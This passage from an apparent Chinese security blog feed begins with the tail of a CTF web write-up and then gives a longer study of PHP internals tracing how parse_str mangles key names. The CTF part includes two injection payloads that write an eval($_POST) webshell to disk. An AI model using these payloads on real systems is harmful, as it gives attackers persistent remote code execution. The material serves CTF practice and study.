class="headerlink" title="写马"></a>写马</h2><h3 id="系统命令写马"><a href="#系统命令写马" class="headerlink" title="系统命令写马"></a>系统命令写马</h3><p><code>?f=system(&quot;echo &#39;\n&lt;?php eval(\$_POST[1]);?&gt;&#39;  &gt; 2.php&quot;);</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291205578.png" alt="image-20220129120539506"></p><p>这题正好就是secret 一般也就是  secret hint这种，然后直接cat 查看源码即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291206561.png" alt="image-20220129120625494"></p><h3 id="PHP函数写马"><a href="#PHP函数写马" class="headerlink" title="PHP函数写马"></a>PHP函数写马</h3><p><code>?f=fputs(fopen(&#39;cmd.php&#39;,&#39;w&#39;),&quot;&lt;?php @eval(\$_POST[cmd])?&gt;&quot;);</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291507879.png" alt="image-20220129120824029"></p><p>然后就和上面一样</p><h2 id="php-amp-phpinfo解法"><a href="#php-amp-phpinfo解法" class="headerlink" title="php&amp;phpinfo解法"></a>php&amp;phpinfo解法</h2><p><strong>php -i</strong></p><p>这条命令等同于phpinfo(); 因此getshell之后可以用它来看phpinfo的信息</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456624.png" alt="image-20220129145606559"></p><p><strong>phpinfo</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456306.png" alt="image-20220129145636243"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP内核学习及部分样例</title>
    <link href="/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/"/>
    <url>/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="内核剖析"><a href="#内核剖析" class="headerlink" title="内核剖析"></a>内核剖析</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li><p><strong>build</strong> 放置和源码编译相关的文件，比如 buildconf，和检查环境的脚本</p></li><li><p><strong>ext</strong>     拓展目录，所有非php基础功能比如 <strong>substring</strong> 都在这个目录以下</p></li><li><p><strong>main</strong>   PHP基础设施</p></li><li><p><strong>Zend</strong>   Zend主要实现语言核心的运行环境，比如脚本语法解析，opcode执行及其拓展机制</p></li><li><p><strong>pear</strong>    PHP拓展与应用仓库，包含PEAR核心文件</p></li><li><p><strong>sapi</strong>    和各种服务器的接口调用，例如apache、IIS等，也包含一般的fastcgi、cgi等</p></li><li><p><strong>win32</strong>    Windows环境下编译PHP有关脚本</p></li><li><p><strong>TSRM</strong>     线程安全目录</p></li></ul><h3 id="PHP生命周期"><a href="#PHP生命周期" class="headerlink" title="PHP生命周期"></a>PHP生命周期</h3><p>​    SAPI指PHP具体应用的编程接口，一切以 <strong>SAPI 开始</strong>，无论是php-cli，还是php-server。比如我们命令行参数传递给PHP解释器要执行的脚本，相当于是通过URL请求了一个PHP页面。</p><p>​    PHP 执行的两个阶段，处理请求之前的开始阶段，请求之后的结束阶段。</p><p>​    处理请求之前的的开始阶段包括 ：</p><p>​        1️⃣ 模块初始化阶段 (MINIT)，只执行一次</p><p>​        2️⃣ 模块激活阶段 (RINIT)</p><h4 id="单进程的SAPI生命周期"><a href="#单进程的SAPI生命周期" class="headerlink" title="单进程的SAPI生命周期"></a>单进程的SAPI生命周期</h4><p><strong>CLI&#x2F;CGI模式</strong>都属于单进程的SASPI模式</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101726955.png" alt="image-20220110172604804"></p><p>如图完成了一个 接受参数 -&gt; 创建进程 -&gt; 处理请求 -&gt; 销毁进程 -&gt; 终止进程的操作</p><h4 id="多进程的SAPI生命周期"><a href="#多进程的SAPI生命周期" class="headerlink" title="多进程的SAPI生命周期"></a>多进程的SAPI生命周期</h4><p>​    通常PHP是<strong>编译一个中间件的模块</strong>来处理PHP请求。Apache一般会采取多进程模式。Apache会fork出多个子进程，每个进程内存空间相对独立，整个进程的生命周期会处理多个请求，只有apache关闭或者进程结束后才会进行关闭阶段。</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101732820.png" alt="image-20220110173239751"></p><p>多线程的SAPI生命周期和 多进程类似，不同的是多线程是在生命周期里<strong>并行的重复 请求 关闭的阶段</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101733999.png" alt="image-20220110173308947"></p><h3 id="SAPI概述"><a href="#SAPI概述" class="headerlink" title="SAPI概述"></a>SAPI概述</h3><p>​    PHP中和服务相关的操作都是通过SAPI的接口实现</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101735370.png" alt="image-20220110173552318"></p><p>​    各个服务的抽象层值之间遵守着相同的约定，这里称之为 SAPI 接口。每个SAPI实现都是一个 _sapi_moudle_struct 结构体变量。</p><p>​    demo:</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">php_cgi_startup</span><span class="hljs-params">(sapi_module_struct *sapi_module)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (php_module_startup(sapi_module, &amp;cgi_module_entry, <span class="hljs-number">1</span>) == FAILURE) &#123;<br><span class="hljs-keyword">return</span> FAILURE;<br>&#125;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过测试这个返回值是 string(6) “SUCCESS”，而且可以用作条件判断</p><p><code>if(php_cgi_startup())&#123; echo 1;&#125;</code></p><p>如果 SUCCESS，输出1</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>**CGI **能实现语言解释器与web服务器的通信。</p><p><strong>FastCGI</strong> 服务器中间件和某个语言后端 进行数据交换的协议，它可以一直执行，还可以支持分布式运算</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102325878.png" alt="image-20220110232512816"></p><h2 id="PHP脚本执行"><a href="#PHP脚本执行" class="headerlink" title="PHP脚本执行"></a>PHP脚本执行</h2><blockquote><p>从这里开始就开始分几个二级标题，因为我觉得这已经脱离了前置知识的范畴</p></blockquote><p>​    先来说一说PHP，PHP是解释性语言，它无需编译即可“直接运行”</p><p>​    但是我们知道最底层是机器语言，实际上还是要有一个转换过程的，这个时候就回需要一个<strong>解释器</strong>，由解释器来执行这些代码，一般会在运行时实时编译，以此来提高效率。PHP为了提高执行效率，提出了opcode缓存拓展(APC,xcache,eAccelerator等)，这样就可以避免重新编译带来的性能损失。</p><p>​    一般来说，程序会经过这样的阶段：</p><p>​        1️⃣传递给php需要执行的文件</p><p>​        2️⃣php完成准备工作后启动PHP及Zend虚拟机，加载注册的拓展模块</p><p>​        3️⃣读取脚本，Zend引擎对脚本文件进行词法分析，语法分析</p><p>​        4️⃣编译为opcode</p><p>对于语法分析见($PHP_SRC&#x2F;Zend&#x2F;zend_language_parser)，它将源代码切成数组</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201110002241.png" alt="image-20220111000256180"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">zend_value</span> &#123;</span>   <span class="hljs-comment">//变量存储在这个联合体里</span><br>zend_long         lval;<span class="hljs-comment">/* long value */</span><br><span class="hljs-keyword">double</span>            dval;<span class="hljs-comment">/* double value */</span><br>zend_refcounted  *counted;<br>zend_string      *str;<br>zend_array       *arr;<br>zend_object      *obj;<br>zend_resource    *res;<br>zend_reference   *ref;   <span class="hljs-comment">//引用次数</span><br>zend_ast_ref     *ast;<br>zval             *zv;<br><span class="hljs-keyword">void</span>             *ptr;<br>zend_class_entry *ce;<br>zend_function    *func;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span> w1;<br><span class="hljs-keyword">uint32_t</span> w2;<br>&#125; ww;<br>&#125; zend_value;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zval_struct</span> &#123;</span><br>zend_value        value;<span class="hljs-comment">/* value */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ZEND_ENDIAN_LOHI_3(<br>zend_uchar    type,<span class="hljs-comment">/* active type */</span><br>zend_uchar    type_flags,<br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">uint16_t</span>  extra;        <span class="hljs-comment">/* not further specified */</span><br>&#125; u)<br>&#125; v;<br><span class="hljs-keyword">uint32_t</span> type_info;<br>&#125; u1;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span>     next;                 <span class="hljs-comment">/* hash collision chain */</span><br><span class="hljs-keyword">uint32_t</span>     cache_slot;           <span class="hljs-comment">/* cache slot (for RECV_INIT) */</span><br><span class="hljs-keyword">uint32_t</span>     opline_num;           <span class="hljs-comment">/* opline number (for FAST_CALL) */</span><br><span class="hljs-keyword">uint32_t</span>     lineno;               <span class="hljs-comment">/* line number (for ast nodes) */</span><br><span class="hljs-keyword">uint32_t</span>     num_args;             <span class="hljs-comment">/* arguments number for EX(This) */</span><br><span class="hljs-keyword">uint32_t</span>     fe_pos;               <span class="hljs-comment">/* foreach position */</span><br><span class="hljs-keyword">uint32_t</span>     fe_iter_idx;          <span class="hljs-comment">/* foreach iterator index */</span><br><span class="hljs-keyword">uint32_t</span>     access_flags;         <span class="hljs-comment">/* class constant access flags */</span><br><span class="hljs-keyword">uint32_t</span>     property_guard;       <span class="hljs-comment">/* single property guard */</span><br><span class="hljs-keyword">uint32_t</span>     constant_flags;       <span class="hljs-comment">/* constant flags */</span><br><span class="hljs-keyword">uint32_t</span>     extra;                <span class="hljs-comment">/* not further specified */</span><br>&#125; u2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>哈希表：通过哈希函数，讲特定的键映射到特定的值的数据结构，维护键和值的对应关系，但是时间复杂度是O(1)比链表O(n)，效率更高</p><h2 id="PHP经典问题解析"><a href="#PHP经典问题解析" class="headerlink" title="PHP经典问题解析"></a>PHP经典问题解析</h2><h3 id="PHP字符串解析问题"><a href="#PHP字符串解析问题" class="headerlink" title="PHP字符串解析问题"></a>PHP字符串解析问题</h3><p>首先来看一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    parse_str(<span class="hljs-string">&#x27;test[abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test.abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-comment">//我们一定期望 tmp 的键名 分别是 test[abc,test abc,test.abc 然而预期的现象并没有发生</span><br><span class="hljs-comment">//返回结果</span><br><br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">3</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">5</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">7</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现 ‘[‘ ,’ ‘和’.’，都被替换为了’_’，接下来让我们从内核的角度看一下为什么会出现这样的问题。</p><p>构建简单的PHP代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    parse_str(<span class="hljs-string">&#x27;test[ab=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>关于 parse_str 函数的定义是在 <code>$PHP_SRC/ext/standard/string.c line 5033</code> 处</p><p>让我们来简单看一下函数定义的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">PHP_FUNCTION(parse_str)<br>&#123;<br><span class="hljs-keyword">char</span> *arg;<br>zval *arrayArg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">size_t</span> arglen;<br><br>ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//Zend虚拟机只负责脚本语义解析，所以这里不用过分关注</span><br>Z_PARAM_STRING(arg, arglen)<br><span class="hljs-function">Z_PARAM_OPTIONAL</span><br><span class="hljs-function"><span class="hljs-title">Z_PARAM_ZVAL</span><span class="hljs-params">(arrayArg)</span></span><br><span class="hljs-function"><span class="hljs-title">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span></span>;<br><br>res = estrndup(arg, arglen);   <span class="hljs-comment">//将字符串拷贝到新建的位置处</span><br><br><span class="hljs-keyword">if</span> (arrayArg == <span class="hljs-literal">NULL</span>) &#123;<br>zval tmp;<br>zend_array *symbol_table;<br><span class="hljs-keyword">if</span> (zend_forbid_dynamic_call(<span class="hljs-string">&quot;parse_str() with a single argument&quot;</span>) == FAILURE) &#123;  <span class="hljs-comment">//错误处理</span><br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>php_error_docref(<span class="hljs-literal">NULL</span>, E_DEPRECATED, <span class="hljs-string">&quot;Calling parse_str() without the result argument is deprecated&quot;</span>);<br><br>symbol_table = zend_rebuild_symbol_table();<br>ZVAL_ARR(&amp;tmp, symbol_table);<br>sapi_module.treat_data(PARSE_STRING, res, &amp;tmp);     <span class="hljs-comment">//负责线程不安全的处理方法，我这里是TS版本所以实际这里不必关注</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(zend_hash_del(symbol_table, ZSTR_KNOWN(ZEND_STR_THIS)) == SUCCESS)) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>arrayArg = zend_try_array_init(arrayArg);<br><span class="hljs-keyword">if</span> (!arrayArg) &#123;<br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>sapi_module.treat_data(PARSE_STRING, res, arrayArg);  <span class="hljs-comment">//这里真正开始解析变量也就是在这个地方下断点</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进来到  <code>$PHP_SRC/main/php_variables.c</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111036660.png" alt="image-20220111103617451"></p><p>这里给出源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">SAPI_API <span class="hljs-title">SAPI_TREAT_DATA_FUNC</span><span class="hljs-params">(php_default_treat_data)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>, *var, *val, *separator = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *c_var;<br>zval <span class="hljs-built_in">array</span>;<br><span class="hljs-keyword">int</span> free_buffer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *strtok_buf = <span class="hljs-literal">NULL</span>;<br>zend_long count = <span class="hljs-number">0</span>;<br><br>ZVAL_UNDEF(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>array_init(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_POST]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_POST], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_GET:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_GET]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_GET], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_COOKIE]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_COOKIE], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ZVAL_COPY_VALUE(&amp;<span class="hljs-built_in">array</span>, destArray);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_POST) &#123;    <span class="hljs-comment">//根据变量的不同类型运行不同解析方法</span><br>sapi_handle_post(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_GET) &#123;<span class="hljs-comment">/* GET data */</span><br>c_var = SG(request_info).query_string;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<span class="hljs-comment">/* Cookie data */</span><br>c_var = SG(request_info).cookie_data;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_STRING) &#123;<span class="hljs-comment">/* String data */</span>  <span class="hljs-comment">//解析字符串 这个才是我们关注的，但是这里没有函数调用接着往下看</span><br>res = str;<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!res) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_STRING:<br>separator = PG(arg_separator).input;  <span class="hljs-comment">//PG是为了解决线程安全的全局变量宏</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>separator = <span class="hljs-string">&quot;;\0&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>var = php_strtok_r(res, separator, &amp;strtok_buf);  <span class="hljs-comment">//字符串切片存入数组，因为这里&amp;strtok_buf是NULL所以这里只是遍历没有影响</span><br><br><span class="hljs-keyword">while</span> (var) &#123;<br><span class="hljs-keyword">size_t</span> val_len;<br><span class="hljs-keyword">size_t</span> new_val_len;<br><br>val = <span class="hljs-built_in">strchr</span>(var, <span class="hljs-string">&#x27;=&#x27;</span>);   <span class="hljs-comment">//=用于区分变量名，变量名对应的变量值 这里val取到了变量的值</span><br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br><span class="hljs-comment">/* Remove leading spaces from cookie names, needed for multi-cookie header where ; can be followed by a space */</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">isspace</span>(*var)) &#123;<br>var++;<br>&#125;<br><span class="hljs-keyword">if</span> (var == val || *var == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-keyword">goto</span> next_cookie;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (++count &gt; PG(max_input_vars)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variables exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_vars in php.ini.&quot;</span>, PG(max_input_vars));      <span class="hljs-comment">//越界检测</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (val) &#123; <span class="hljs-comment">/* have a value */</span>   <span class="hljs-comment">//就是在尾巴加上结束符</span><br><br>*val++ = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br>val_len = php_raw_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val_len = php_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val     = <span class="hljs-string">&quot;&quot;</span>;<br>val_len =  <span class="hljs-number">0</span>;<br>&#125;<br><br>val = estrndup(val, val_len);<br><span class="hljs-keyword">if</span> (arg != PARSE_COOKIE) &#123;<br>php_url_decode(var, <span class="hljs-built_in">strlen</span>(var));<br>&#125;<br><span class="hljs-keyword">if</span> (sapi_module.input_filter(arg, var, &amp;val, val_len, &amp;new_val_len)) &#123;<br>php_register_variable_safe(var, val, new_val_len, &amp;<span class="hljs-built_in">array</span>);   <span class="hljs-comment">//这里开始真正注册变量了 标重点！！！！！！！！！！！！下面放图</span><br>&#125;<br>efree(val);<br>next_cookie:<br>var = php_strtok_r(<span class="hljs-literal">NULL</span>, separator, &amp;strtok_buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (free_buffer) &#123;<br>efree(res);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到最终会运行 php_register_variable_ex  上面的 